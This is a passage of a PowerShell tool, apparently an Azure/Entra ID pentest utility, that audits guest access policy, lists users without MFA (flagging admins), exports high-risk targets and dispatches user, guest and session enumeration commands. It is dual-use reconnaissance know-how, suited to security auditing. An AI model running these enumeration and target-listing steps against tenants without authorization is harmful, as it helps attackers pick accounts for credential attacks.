        Write-ColorOutput -Message "    (Determines what guests can enumerate - the 'null session' equivalent)" -Color "DarkGray"
        
        try {
            $authPolicy = Invoke-MgGraphRequest -Uri "https://graph.microsoft.com/v1.0/policies/authorizationPolicy" -Method GET -ErrorAction Stop
            
            $guestAccess = $authPolicy.guestUserRoleId
            
            # Guest role IDs:
            # a0b1b346-4d3e-4e8b-98f8-753987be4970 = Same as member users (MOST PERMISSIVE)
            # 10dae51f-b6af-4016-8d66-8c2a99b929b3 = Limited access (default)
            # 2af84b1e-32c8-42b7-82bc-daa82404023b = Restricted access (MOST RESTRICTIVE)
            
            $guestPermissionLevel = switch ($guestAccess) {
                "a0b1b346-4d3e-4e8b-98f8-753987be4970" { "SameAsMemberUsers" }
                "10dae51f-b6af-4016-8d66-8c2a99b929b3" { "LimitedAccess" }
                "2af84b1e-32c8-42b7-82bc-daa82404023b" { "RestrictedAccess" }
                default { "Unknown ($guestAccess)" }
            }
            
            if ($guestAccess -eq "a0b1b346-4d3e-4e8b-98f8-753987be4970") {
                $finding = [PSCustomObject]@{
                    Type = "Policy"
                    Target = "GuestUserAccess"
                    Vulnerability = "GuestAccessSameAsMember"
                    Risk = "HIGH"
                    Description = "Guest users have SAME permissions as member users - full directory enumeration possible"
                    Authenticated = $true
                    GuestRoleId = $guestAccess
                    PermissionLevel = $guestPermissionLevel
                }
                $authFindings += $finding
                Write-ColorOutput -Message "    [!] CRITICAL: Guest access = SAME AS MEMBER USERS" -Color "Red"
                Write-ColorOutput -Message "        Guests can enumerate entire directory (null session equivalent)" -Color "DarkGray"
            } elseif ($guestAccess -eq "10dae51f-b6af-4016-8d66-8c2a99b929b3") {
                $finding = [PSCustomObject]@{
                    Type = "Policy"
                    Target = "GuestUserAccess"
                    Vulnerability = "GuestAccessLimited"
                    Risk = "MEDIUM"
                    Description = "Guest users have limited access - can still enumerate some directory info"
                    Authenticated = $true
                    GuestRoleId = $guestAccess
                    PermissionLevel = $guestPermissionLevel
                }
                $authFindings += $finding
                Write-ColorOutput -Message "    [!] Guest access = LIMITED (default)" -Color "Yellow"
                Write-ColorOutput -Message "        Guests can enumerate users/groups they interact with" -Color "DarkGray"
            } else {
                Write-ColorOutput -Message "    [+] Guest access = RESTRICTED (most secure)" -Color "Green"
                Write-ColorOutput -Message "        Guests can only see their own profile" -Color "DarkGray"
            }
            
            # Check if guest invite settings are permissive
            $guestInviteSettings = $authPolicy.allowInvitesFrom
            if ($guestInviteSettings -eq "everyone") {
                $finding = [PSCustomObject]@{
                    Type = "Policy"
                    Target = "GuestInvitePolicy"
                    Vulnerability = "AnyoneCanInviteGuests"
                    Risk = "MEDIUM"
                    Description = "Anyone (including guests) can invite external users"
                    Authenticated = $true
                    AllowInvitesFrom = $guestInviteSettings
                }
                $authFindings += $finding
                Write-ColorOutput -Message "    [!] Guest invites: ANYONE can invite (including guests)" -Color "Yellow"
            } elseif ($guestInviteSettings -eq "adminsAndGuestInviters") {
                Write-ColorOutput -Message "    [*] Guest invites: Admins and Guest Inviters only" -Color "DarkGray"
            } else {
                Write-ColorOutput -Message "    [+] Guest invites: Admins only" -Color "Green"
            }
            
        } catch {
            Write-ColorOutput -Message "    [!] Could not check authorization policy (requires Policy.Read.All)" -Color "DarkGray"
        }
        
        # 2.8 Check for users without MFA registered
        Write-ColorOutput -Message "`n[*] Checking for users without MFA methods registered..." -Color "Yellow"
        Write-ColorOutput -Message "    (Users vulnerable to credential stuffing/phishing)" -Color "DarkGray"
        
        try {
            # Get authentication methods registration details
            $authMethodsReport = Invoke-MgGraphRequest -Uri "https://graph.microsoft.com/v1.0/reports/authenticationMethods/userRegistrationDetails" -Method GET -ErrorAction Stop
            
            $noMfaUsers = @()
            $mfaRegisteredCount = 0
            $totalChecked = 0
            
            foreach ($user in $authMethodsReport.value) {
                $totalChecked++
                
                # Check if user has any MFA method registered
                $hasMfa = $user.isMfaRegistered -eq $true
                
                if (-not $hasMfa) {
                    $noMfaUsers += $user
                    
                    if ($noMfaUsers.Count -le 5) {
                        $finding = [PSCustomObject]@{
                            Type = "User"
                            Target = $user.userDisplayName
                            UPN = $user.userPrincipalName
                            Vulnerability = "NoMFARegistered"
                            Risk = "HIGH"
                            Description = "User has no MFA methods registered - vulnerable to credential attacks"
                            Authenticated = $true
                            IsAdmin = $user.isAdmin
                            MethodsRegistered = ($user.methodsRegistered -join ', ')
                        }
                        $authFindings += $finding
                    }
                } else {
                    $mfaRegisteredCount++
                }
            }
            
            # Show results
            if ($noMfaUsers.Count -gt 0) {
                Write-ColorOutput -Message "    [!] Users WITHOUT MFA: $($noMfaUsers.Count)" -Color "Red"
                
                # Show first few
                $displayCount = [Math]::Min(5, $noMfaUsers.Count)
                for ($i = 0; $i -lt $displayCount; $i++) {
                    $u = $noMfaUsers[$i]
                    $adminTag = if ($u.isAdmin) { " [ADMIN]" } else { "" }
                    Write-ColorOutput -Message "        - $($u.userDisplayName)$adminTag" -Color "Red"
                }
                
                if ($noMfaUsers.Count -gt 5) {
                    Write-ColorOutput -Message "        ... and $($noMfaUsers.Count - 5) more" -Color "DarkGray"
                }
                
                # Check for admins without MFA (critical)
                $adminsNoMfa = $noMfaUsers | Where-Object { $_.isAdmin -eq $true }
                if ($adminsNoMfa.Count -gt 0) {
                    Write-ColorOutput -Message "    [!] CRITICAL: $($adminsNoMfa.Count) ADMIN(S) without MFA!" -Color "Red"
                }
            } else {
                Write-ColorOutput -Message "    [+] All users have MFA registered" -Color "Green"
            }
            
            Write-ColorOutput -Message "    [*] Total checked: $totalChecked | With MFA: $mfaRegisteredCount | Without: $($noMfaUsers.Count)" -Color "DarkGray"
            
        } catch {
            if ($_.Exception.Message -like "*403*" -or $_.Exception.Message -like "*Forbidden*") {
                Write-ColorOutput -Message "    [!] Access Denied - Requires UserAuthenticationMethod.Read.All or Reports.Read.All" -Color "Yellow"
                Write-ColorOutput -Message "        Try alternative: checking per-user auth methods (slower)" -Color "DarkGray"
            } else {
                Write-ColorOutput -Message "    [!] Could not retrieve MFA registration report" -Color "DarkGray"
                Write-ColorOutput -Message "        Error: $($_.Exception.Message)" -Color "DarkGray"
            }
        }
    }
    
    # ============================================
    # SUMMARY AND EXPORT
    # ============================================
    Write-ColorOutput -Message "`n[*] ========================================" -Color "Cyan"
    Write-ColorOutput -Message "[*] VULNERABILITY SUMMARY" -Color "Cyan"
    Write-ColorOutput -Message "[*] ========================================`n" -Color "Cyan"
    
    # Combine all findings
    $vulnTargets = $unauthFindings + $authFindings
    
    # Count by risk level
    $highRisk = ($vulnTargets | Where-Object { $_.Risk -eq "HIGH" }).Count
    $mediumRisk = ($vulnTargets | Where-Object { $_.Risk -eq "MEDIUM" }).Count
    $lowRisk = ($vulnTargets | Where-Object { $_.Risk -eq "LOW" }).Count
    
    Write-ColorOutput -Message "AZR".PadRight(12) + $(if ($Domain) { $Domain } else { "(auto-detected)" }).ToString().PadRight(35) + "443".PadRight(7) + "[*] Vuln-List Results" -Color "Cyan"
    Write-ColorOutput -Message ""
    
    if ($highRisk -gt 0) {
        Write-ColorOutput -Message "    [!] HIGH RISK findings:   $highRisk" -Color "Red"
    }
    if ($mediumRisk -gt 0) {
        Write-ColorOutput -Message "    [!] MEDIUM RISK findings: $mediumRisk" -Color "Yellow"
    }
    if ($lowRisk -gt 0) {
        Write-ColorOutput -Message "    [*] LOW RISK findings:    $lowRisk" -Color "DarkGray"
    }
    
    Write-ColorOutput -Message "    [*] Total findings:       $($vulnTargets.Count)" -Color "Cyan"
    Write-ColorOutput -Message ""
    
    # Export if requested
    if ($ExportPath -and $vulnTargets.Count -gt 0) {
        try {
            $extension = [System.IO.Path]::GetExtension($ExportPath).ToLower()
            
            if ($extension -eq ".csv") {
                $vulnTargets | Export-Csv -Path $ExportPath -NoTypeInformation -Force
            } elseif ($extension -eq ".json") {
                $vulnTargets | ConvertTo-Json -Depth 10 | Out-File -FilePath $ExportPath -Force
            } elseif ($extension -eq ".txt") {
                # Text format similar to nxc relay list
                $relayList = $vulnTargets | Where-Object { $_.Risk -eq "HIGH" } | ForEach-Object {
                    "$($_.Type),$($_.Target),$($_.Vulnerability)"
                }
                $relayList | Out-File -FilePath $ExportPath -Force
                Write-ColorOutput -Message "[+] Exported $($relayList.Count) HIGH risk targets to: $ExportPath" -Color "Green"
            } else {
                # Default to JSON
                $vulnTargets | ConvertTo-Json -Depth 10 | Out-File -FilePath $ExportPath -Force
            }
            
            if ($extension -ne ".txt") {
                Write-ColorOutput -Message "[+] Full results exported to: $ExportPath" -Color "Green"
            }
        } catch {
            Write-ColorOutput -Message "[!] Failed to export results: $_" -Color "Red"
        }
    }
    
    # Provide recommendations
    Write-ColorOutput -Message "`n[*] RECOMMENDATIONS:" -Color "Yellow"
    
    if ($highRisk -gt 0) {
        Write-ColorOutput -Message "    [!] Address HIGH risk findings immediately:" -Color "Red"
        Write-ColorOutput -Message "        - Replace password credentials with certificates for service principals" -Color "DarkGray"
        Write-ColorOutput -Message "        - Block legacy authentication via Conditional Access" -Color "DarkGray"
        Write-ColorOutput -Message "        - Review and minimize dangerous API permissions" -Color "DarkGray"
    }
    
    if ($mediumRisk -gt 0) {
        Write-ColorOutput -Message "    [*] Review MEDIUM risk findings:" -Color "Yellow"
        Write-ColorOutput -Message "        - Audit public client applications" -Color "DarkGray"
        Write-ColorOutput -Message "        - Clean up stale guest accounts" -Color "DarkGray"
        Write-ColorOutput -Message "        - Enable Security Defaults or equivalent CA policies" -Color "DarkGray"
    }
    
    Write-ColorOutput -Message "`n[*] Vuln-list enumeration complete!" -Color "Green"
    
    return $vulnTargets
}

# Main execution
# For tenant discovery and user enumeration, we don't need Graph module
# For authenticated commands (hosts, groups, pass-pol, sessions), we need Graph module
# vuln-list handles authentication internally (hybrid unauthenticated + authenticated)
if ($Command -in @("hosts", "groups", "pass-pol", "sessions", "user-profiles")) {
    Initialize-GraphModule
    
    # Determine required scopes based on command
    $requiredScopes = switch ($Command) {
        "hosts" { "Device.Read.All" }
        "user-profiles" { "User.Read.All,Directory.Read.All,AuditLog.Read.All" }
        "groups" { "Group.Read.All,Directory.Read.All" }
        "pass-pol" { "Organization.Read.All,Directory.Read.All,Policy.Read.All" }
        "sessions" { "AuditLog.Read.All,Directory.Read.All" }
        default { $Scopes }
    }
    
    Connect-GraphAPI -Scopes $requiredScopes
}

# vuln-list requires Graph module but handles connection internally
if ($Command -eq "vuln-list") {
    Initialize-GraphModule
}

switch ($Command) {
    "hosts" {
        Invoke-HostEnumeration -Filter $Filter -ShowOwners $ShowOwners -ExportPath $ExportPath
    }
    "tenant" {
        Invoke-TenantDiscovery -Domain $Domain -ExportPath $ExportPath
    }
    "users" {
        Invoke-UserEnumeration -Domain $Domain -Username $Username -UserFile $UserFile -CommonUsernames $CommonUsernames -ExportPath $ExportPath
    }
    "user-profiles" {
        Invoke-UserProfileEnumeration -ExportPath $ExportPath
    }
    "groups" {
        Invoke-GroupEnumeration -ShowMembers $ShowOwners -ExportPath $ExportPath
    }
    "pass-pol" {
        Invoke-PasswordPolicyEnumeration -ExportPath $ExportPath
    }
    "guest" {
        Invoke-GuestEnumeration -Domain $Domain -Username $Username -Password $Password -UserFile $UserFile -ExportPath $ExportPath
    }
    "vuln-list" {
        Invoke-VulnListEnumeration -Domain $Domain -ExportPath $ExportPath
    }
    "sessions" {
        Invoke-SessionEnumeration -Username $Username -ExportPath $ExportPath -Hours $Hours
    }
    default {
        Write-ColorOutput -Message "[!] Unknown command: $Command" -Color "Red"
        Write-ColorOutput -Message "[*] Available commands: hosts, tenant, users, user-profiles, groups, pass-pol, guest, vuln-list, sessions" -Color "Yellow"
    }
}
